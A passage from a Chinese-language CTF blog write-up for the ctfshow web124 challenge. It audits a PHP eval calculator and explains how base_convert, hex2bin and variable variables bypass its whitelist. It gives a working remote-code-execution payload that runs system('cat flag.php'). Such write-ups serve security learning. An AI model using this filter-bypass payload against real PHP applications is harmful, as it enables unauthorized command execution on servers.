&#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="line">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //帮你算出答案</span><br><span class="line">    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这里需要对源码进行代码审计，逐段进行分析：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">// 接收参数c并将参数c的值赋值给变量$content</span><br><span class="line">$content = $_GET[&#x27;c&#x27;];</span><br><span class="line">// 参数c的值长度不能超过80个字符</span><br><span class="line">if (strlen($content) &gt;= 80) &#123;</span><br><span class="line">    die(&quot;太长了不会算&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过以上代码得到第一个条件：<strong>参数 c 的值长度不能大于 80 个字符。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">// 定义黑名单: 空格、TAB键、换行符、单引号、双引号、反引号、左中括号、右中括号。</span><br><span class="line">$blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span><br><span class="line">    // 遍历黑名单数组 取出每个值</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        // 遍历用户传入参数c值是否带有黑名单的字符</span><br><span class="line">        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过以上代码得到第二个条件：<strong>参数 c 的值不能带有 空格、TAB 键、换行符、单引号、双引号、反引号、左中括号、右中括号。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line"> // 定义白名单</span><br><span class="line"> $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="line">        // 从用户传入的c参数值中匹配: a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff，并将匹配到的每个值放入$used_funcs数组中。</span><br><span class="line">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);  </span><br><span class="line">        // 遍历$user_funcs数组的每个值</span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">       // 将$user_funcs数组中每个元素与白名单中的对比，必须在白名单中，才可以</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>preg_match_all</strong></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>pattern</code></td>
+<td>执行的正则表达式</td>
+</tr>
+<tr>
+<td><code>subject</code></td>
+<td>执行操作的字符串</td>
+</tr>
+<tr>
+<td><code>matches</code></td>
+<td>多维数组中所有匹配项的数组。（其实就是将匹配到的值，放入到一个多维数组中）。</td>
+</tr>
+</tbody></table>
+<p>函数示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">$str1 = &#x27;hello world my name is x1ong&#x27;;</span><br><span class="line">preg_match_all(&quot;/hello|world|name|x1ong/&quot;, $str1, $arr);</span><br><span class="line">print_r($arr);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219237_65a394a53b3bc27af9f0b.png"><img src="https://image.3001.net/images/20240114/1705219237_65a394a53b3bc27af9f0b.png" alt="image-20231026183919106"></a></p>
+<p>通过以上代码得到第三个条件：使用的函数必须在 <code>$whitelist</code> 数组中所定义。</p>
+<p>条件总结如下：</p>
+<ul>
+<li>参数 c 的值长度<strong>不能大于 80</strong> 个字符</li>
+<li>参数 c 的值不能带有 <strong>空格、TAB 键、换行符、单引号、双引号、反引号、左中括号、右中括号。</strong></li>
+<li>使用的函数必须在 <code>$whitelist</code> 列表中所定义。</li>
+</ul>
+<h3 id="知识了解"><a href="#知识了解" class="headerlink" title="知识了解"></a>知识了解</h3><h4 id="函数知识"><a href="#函数知识" class="headerlink" title="函数知识"></a>函数知识</h4><p><strong>base_convert</strong></p>
+<p>在任意基数之间转换数字</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>num</code></td>
+<td>必需。规定要转换的数。</td>
+</tr>
+<tr>
+<td><code>frombase</code></td>
+<td>必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</td>
+</tr>
+<tr>
+<td><code>tobase</code></td>
+<td>必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</td>
+</tr>
+</tbody></table>
+<p>在 36 进制中是包含 a-z、0-9 的，我们通过以上网站进行转换，尝试构造出 <code>hex2bin</code> ：</p>
+<p><a target="_blank" rel="noopener" href="https://tool.oschina.net/hexconvert">https://tool.oschina.net/hexconvert</a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219241_65a394a993f543a1a498c.png"><img src="https://image.3001.net/images/20240114/1705219241_65a394a993f543a1a498c.png" alt="image-20231026192711497"></a></p>
+<p>32 进制 <code>hex2bin</code> 得到的十进制为：<code>37907361743</code>，我们这里使用 <code>base_convert</code> 函数进行转换，即可得到 <code>hex2bin</code>。</p>
+<p>代码示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">echo base_convert(37907361743,10,36);  // 输出结果: hex2bin</span><br></pre></td></tr></table></figure>
+
+<p><strong>dechex</strong></p>
+<p>将十进制转为十六进制</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>num</code></td>
+<td>要转换的十进制值</td>
+</tr>
+</tbody></table>
+<p>代码示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php </span><br><span class="line">echo dechex(10); // 输出结果: A</span><br></pre></td></tr></table></figure>
+
+<h4 id="PHP7-特性了解"><a href="#PHP7-特性了解" class="headerlink" title="PHP7 特性了解"></a>PHP7 特性了解</h4><p><strong>特性一：函数其他的调用方式</strong></p>
+<p>在 PHP7 版本中，函数的调用以及传参可以使用如下方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">// 比如这里我们需要使用system函数执行系统的命令 whoami， 正常情况下，我们需要这么写:</span><br><span class="line">system(&#x27;whoami&#x27;);</span><br><span class="line">// 但是在PHP7版本中，我们还可以这么写:</span><br><span class="line">(&#x27;system&#x27;)(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219248_65a394b0301c5f48ef766.png"><img src="https://image.3001.net/images/20240114/1705219248_65a394b0301c5f48ef766.png" alt="image-20231026193948351"></a></p>
+<p>在上图中可以看到，两者均可实现相同的功能。</p>
+<p><strong>特性二：动态变量调用</strong></p>
+<p>代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">$a = &#x27;_GET&#x27;;</span><br><span class="line">var_dump($$a);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219252_65a394b4b6c5fb5118c1c.png"><img src="https://image.3001.net/images/20240114/1705219252_65a394b4b6c5fb5118c1c.png" alt="image-20231026194748275"></a></p>
+<p>可以发现，当我们构造出字符串 <code>GET</code>、然后将其赋值给变量 <code>$a</code>，接在在使用 <code>$a</code> 变量的时候，在其前面加上 <code>$</code>，即 <code>$$a</code>，即可实现 <code>$_GET</code> 的效果。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219256_65a394b8893c718cd3ff2.png"><img src="https://image.3001.net/images/20240114/1705219256_65a394b8893c718cd3ff2.png" alt="image-20231026194939314"></a></p>
+<p>再看第二个图片：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219260_65a394bcad0d530622c8f.png"><img src="https://image.3001.net/images/20240114/1705219260_65a394bcad0d530622c8f.png" alt="image-20231026195736886"></a></p>
+<p>可以看到，我们在 PHP 中可以使用 <code>$$a&#123;name&#125;</code> 接收通过 GET 请求传入的 <code>name</code> 参数，但是前提 <code>$a</code> 变量的值为 <code>GET</code>。</p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs=system&amp;acos=cat flag.php</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219264_65a394c03d0b4be218094.png"><img src="https://image.3001.net/images/20240114/1705219264_65a394c03d0b4be218094.png" alt="image-20231027184942963"></a></p>
+<p>释义：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">$pi=base_convert(37907361743,10,36) // 得到: hex2bin </span><br><span class="line">  </span><br><span class="line">$pi=base_convert(37907361743,10,36)(dechex(1598506324)); // 构造出 hex2bin(dechex(1598506324)) 得到 _GET </span><br><span class="line"></span><br><span class="line">$$pi&#123;abs&#125; // 得到 $_GET[abs]</span><br><span class="line">$$pi&#123;abs&#125;($$pi&#123;acos&#125;) // 传入 abs=system&amp;acos=ls  得到system(ls);</span><br></pre></td></tr></table></figure>
+
+<p>最终被带入题目中的 <code>eval</code> 函数中，因此字符串可以直接解析为 PHP 代码执行，实际执行的内容如下：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219268_65a394c4555afbdc73d2a.png"><img src="https://image.3001.net/images/20240114/1705219268_65a394c4555afbdc73d2a.png" alt="image-20231027190256892"></a></p>
+</div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Gu0f3n</div><div class="author-info__description">石匠敲击石头的101次</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Gu0f3n?tab=repositories"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Gu0f3n?tab=repositories" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://weibo.com/u/3833024804" target="_blank" title="microblog"><i class="fa-brands fa-microblog" style="color: #FF0000;"></i></a><a class="social-icon" href="https://space.bilibili.com/282616786?spm_id_from=333.337.0.0" target="_blank" title="Bilibili"><i class="fa-brands fa-bilibili" style="color: #FFC0CB;"></i></a><a class="social-icon" href="https://www.douyin.com/user/MS4wLjABAAAA13z3eSKpDESynATlUFIUGCPdSHi7oID9u2rz2bHH6aE" target="_blank" title="tiktok"><i class="fa-brands fa-tiktok" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web29-%E8%BF%87%E6%BB%A4-FLAG"><span class="toc-number">1.</span> <span class="toc-text">web29 过滤 FLAG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web30-%E7%AE%80%E5%8D%95%E7%9A%84%E8%BF%87%E6%BB%A4-1"><span class="toc-number">2.</span> <span class="toc-text">web30 简单的过滤 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web31-%E7%AE%80%E5%8D%95%E7%9A%84%E6%97%A0%E5%8F%82-RCE"><span class="toc-number">3.</span> <span class="toc-text">web31 简单的无参 RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web32-php-%E4%BC%AA%E5%8D%8F%E8%AE%AE-1"><span class="toc-number">4.</span> <span class="toc-text">web32 php 伪协议 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web33-36-php-%E4%BC%AA%E5%8D%8F%E8%AE%AE-2"><span class="toc-number">5.</span> <span class="toc-text">web33-36 php 伪协议 - 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web37-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%87%E6%BB%A4-flag"><span class="toc-number">6.</span> <span class="toc-text">web37 文件包含过滤 flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web38-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%87%E6%BB%A4-flag-%E5%92%8C-php"><span class="toc-number">7.</span> <span class="toc-text">web38 文件包含过滤 flag 和 php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web39-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%87%E6%BB%A4-flag-%E5%B9%B6%E6%B7%BB%E5%8A%A0%E5%90%8E%E7%BC%80"><span class="toc-number">8.</span> <span class="toc-text">web39 文件包含过滤 flag 并添加后缀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web40-%E6%97%A0%E5%8F%82-RCE-1"><span class="toc-number">9.</span> <span class="toc-text">web40 无参 RCE-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web41-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97-RCE"><span class="toc-number">10.</span> <span class="toc-text">web41 无字母数字 RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web42-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91-1"><span class="toc-number">11.</span> <span class="toc-text">web42 输出重定向 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web43-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91-2"><span class="toc-number">12.</span> <span class="toc-text">web43 输出重定向 - 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web44-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91-3"><span class="toc-number">13.</span> <span class="toc-text">web44 输出重定向 - 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web45-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91-4"><span class="toc-number">14.</span> <span class="toc-text">web45 输出重定向 - 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web46-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91-5"><span class="toc-number">15.</span> <span class="toc-text">web46 输出重定向 - 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web47-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91-6"><span class="toc-number">16.</span> <span class="toc-text">web47 输出重定向 - 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web48-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91-7"><span class="toc-number">17.</span> <span class="toc-text">web48 输出重定向 - 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web49-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91-8"><span class="toc-number">18.</span> <span class="toc-text">web49 输出重定向 - 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web50-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91-9"><span class="toc-number">19.</span> <span class="toc-text">web50 输出重定向 - 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web51-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91-10"><span class="toc-number">20.</span> <span class="toc-text">web51 输出重定向 - 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web52-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91-11"><span class="toc-number">21.</span> <span class="toc-text">web52 输出重定向 - 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web53-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91-12"><span class="toc-number">22.</span> <span class="toc-text">web53 输出重定向 - 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web54-%E8%BF%87%E6%BB%A4%E6%89%80%E6%9C%89%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4"><span class="toc-number">23.</span> <span class="toc-text">web54 过滤所有读取文件命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web55-%E6%97%A0%E5%AD%97%E6%AF%8D-RCE-1"><span class="toc-number">24.</span> <span class="toc-text">web55 无字母 RCE-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web56-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97-RCE-1"><span class="toc-number">25.</span> <span class="toc-text">web56 无字母数字 RCE-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web57-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97-RCE-2"><span class="toc-number">26.</span> <span class="toc-text">web57 无字母数字 RCE-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web58-%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8-1"><span class="toc-number">27.</span> <span class="toc-text">web58 函数禁用 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web59-%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8-2"><span class="toc-number">28.</span> <span class="toc-text">web59 函数禁用 - 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web60-65-%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8-3"><span class="toc-number">29.</span> <span class="toc-text">web60-65 函数禁用 - 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web66-67-%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8-4"><span class="toc-number">30.</span> <span class="toc-text">web66-67 函数禁用 - 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web68-%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8-5"><span class="toc-number">31.</span> <span class="toc-text">web68 函数禁用 - 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web69-%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8-6"><span class="toc-number">32.</span> <span class="toc-text">web69 函数禁用 - 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web70-%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8-7"><span class="toc-number">33.</span> <span class="toc-text">web70 函数禁用 - 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web71-%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8-8"><span class="toc-number">34.</span> <span class="toc-text">web71 函数禁用 - 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web72-%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8-9"><span class="toc-number">35.</span> <span class="toc-text">web72 函数禁用 - 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web73-%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8-10"><span class="toc-number">36.</span> <span class="toc-text">web73 函数禁用 - 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web74-%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8-11"><span class="toc-number">37.</span> <span class="toc-text">web74 函数禁用 - 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web75-76-%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8-12"><span class="toc-number">38.</span> <span class="toc-text">web75-76 函数禁用 - 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web77-%E5%87%BD%E6%95%B0%E7%A6%81%E7%94%A8-13"><span class="toc-number">39.</span> <span class="toc-text">web77 函数禁用 - 13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web118-%E5%88%A9%E7%94%A8-PATH-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">40.</span> <span class="toc-text">web118 利用 PATH 读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web119-%E5%88%A9%E7%94%A8%E5%86%85%E7%BD%AE%E5%8F%98%E9%87%8F-%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-1"><span class="toc-number">41.</span> <span class="toc-text">web119 利用内置变量 + 通配符的文件读取 - 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web120-%E5%88%A9%E7%94%A8%E5%86%85%E7%BD%AE%E5%8F%98%E9%87%8F-%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-2"><span class="toc-number">42.</span> <span class="toc-text">web120 利用内置变量 + 通配符的文件读取 - 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web121-%E5%88%A9%E7%94%A8%E5%86%85%E7%BD%AE%E5%8F%98%E9%87%8F-%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-3"><span class="toc-number">43.</span> <span class="toc-text">web121 利用内置变量 + 通配符的文件读取 - 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web122-web121-%E5%88%A9%E7%94%A8%E5%86%85%E7%BD%AE%E5%8F%98%E9%87%8F-%E9%80%9A%E9%85%8D%E7%AC%A6%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-4"><span class="toc-number">44.</span> <span class="toc-text">web122 web121 利用内置变量 + 通配符的文件读取 - 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web124-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">45.</span> <span class="toc-text">web124 代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">45.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E4%BA%86%E8%A7%A3"><span class="toc-number">45.2.</span> <span class="toc-text">知识了解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%9F%A5%E8%AF%86"><span class="toc-number">45.2.1.</span> <span class="toc-text">函数知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP7-%E7%89%B9%E6%80%A7%E4%BA%86%E8%A7%A3"><span class="toc-number">45.2.2.</span> <span class="toc-text">PHP7 特性了解</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">45.3.</span> <span class="toc-text">题解</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/07/30/Ciscn2024web%E5%A4%8D%E7%8E%B0/" title="Ciscn2024web复现"><img src="https://s2.loli.net/2024/07/30/A7fCsSBPd9GObL8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Ciscn2024web复现"/></a><div class="content"><a class="title" href="/2024/07/30/Ciscn2024web%E5%A4%8D%E7%8E%B0/" title="Ciscn2024web复现">Ciscn2024web复现</a><time datetime="2024-07-30T08:09:48.000Z" title="发表于 2024-07-30 16:09:48">2024-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/28/ctfshow%E6%91%86%E7%83%82%E6%9D%AF%E5%A4%8D%E7%8E%B0/" title="ctfshow摆烂杯复现"><img src="https://i.postimg.cc/7YvvqGZS/mmexport1721374650899.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow摆烂杯复现"/></a><div class="content"><a class="title" href="/2024/07/28/ctfshow%E6%91%86%E7%83%82%E6%9D%AF%E5%A4%8D%E7%8E%B0/" title="ctfshow摆烂杯复现">ctfshow摆烂杯复现</a><time datetime="2024-07-28T02:06:45.000Z" title="发表于 2024-07-28 10:06:45">2024-07-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/24/Sanic-s-revenge-%E5%A4%8D%E7%8E%B0/" title="Sanic's revenge(复现)"><img src="https://i.postimg.cc/YqYY9Lmg/mmexport1721374615530.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Sanic's revenge(复现)"/></a><div class="content"><a class="title" href="/2024/07/24/Sanic-s-revenge-%E5%A4%8D%E7%8E%B0/" title="Sanic's revenge(复现)">Sanic's revenge(复现)</a><time datetime="2024-07-24T02:27:14.000Z" title="发表于 2024-07-24 10:27:14">2024-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/19/ctfshow%E5%8E%9F%E8%B0%85%E6%9D%AF%E5%A4%8D%E7%8E%B0/" title="ctfshow原谅杯"><img src="https://i.postimg.cc/FKzZP7Tf/mmexport1721374620968.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow原谅杯"/></a><div class="content"><a class="title" href="/2024/07/19/ctfshow%E5%8E%9F%E8%B0%85%E6%9D%AF%E5%A4%8D%E7%8E%B0/" title="ctfshow原谅杯">ctfshow原谅杯</a><time datetime="2024-07-19T07:35:44.000Z" title="发表于 2024-07-19 15:35:44">2024-07-19</time></div></div><div class="aside-list-item"><a class="thumbnail" 